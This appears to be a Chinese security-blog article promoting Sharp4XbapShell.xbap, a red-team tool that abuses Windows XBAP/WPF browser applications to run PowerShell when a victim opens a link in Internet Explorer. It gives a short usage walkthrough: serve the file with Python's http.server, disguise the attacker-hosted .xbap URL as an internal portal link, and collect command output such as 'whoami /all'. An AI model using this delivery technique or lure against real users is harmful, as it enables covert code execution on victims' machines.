...
原创 专攻.NET安全的  dotNet安全矩阵   2025-05-19 00:20  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/NO8Q9ApS1YibJO9SDRBvE01T4A1oYJXlTBTMvb7KbAf7z9hY3VQUeayWI61XqQ0ricUQ8G1FykKHBNwCqpV792qg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
XBAP 是 Microsoft WPF 提供的一种部署方式，允许开发者将基于 WPF 的 .NET 应用以浏览器插件形式运行。其文件扩展名为 .xbap  
，通常由 Internet Explorer 加载，并通过系统的 PresentationHost.exe  
 进程运行。  
...
Sharp4XbapShell.xbap 是一款针对红队内网渗透场景设计的远程执行工具，利用了 Windows 中一种较为冷门但功能强大的技术——**XBAP**  
，实现通过浏览器访问 .xbap  
 文件并执行 PowerShell 命令的目的，具备较强的隐蔽性与绕过能力。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibcYzRHEbMJ94q4RpsEsiaK1SBByNanmTWF8UpnA6varV2icibt6FvRLMcnzhkoibvNAuzePe3FCCjovQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**02. 工具实战用法**  
  
  
  
Sharp4XbapShell.xbap 利用了 XBAP 技术，在用户访问特定链接时自动加载并执行预定义的 WPF 应用，而该 WPF 应用内嵌了对 PowerShell 的调用逻辑。在红队或内网横向中，攻击者可将该工具部署到攻击机上的 HTTP 服务中，并引导目标访问链接。  
## 2.1 启动Web服务  
  
使用 Python  
 快速起一个 HTTP  
 服务，确保 Sharp4XbapShell.xbap  
 文件放在该目录下。  
  
```
cd uploadpython3 -m http.server 80
```  
  
## 2.2 点击链接  
  
将如下链接伪装为内部门户或通知链接，在 IE 浏览器中访问此链接，应用会自动加载并执行。  
  
```
http://192.168.101.154/upload/Sharp4XbapShell.xbap
```  
  
  
程序在运行后将默认执行系统命令，如 whoami /all，并将结果回传或输出，具体如下图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibcYzRHEbMJ94q4RpsEsiaK1sib3CRldpA6FPEQgHibmFB2OV00E4LJOkMOX2Hic9pwTk0CF8aIQnQt6g/640?wx_fmt=png&from=appmsg "")  
  
综上，Sharp4XbapShell.xbap  
 是一款充分利用 Windows 冷门组件的红队工具，结合了浏览器触发机制、受信任组件执行与 WPF 的可扩展性，能够在特定场景下实现有效绕过与命令执行。文章涉及的工  
具已  
打包在星球，感兴趣的朋友可以加入自取。  
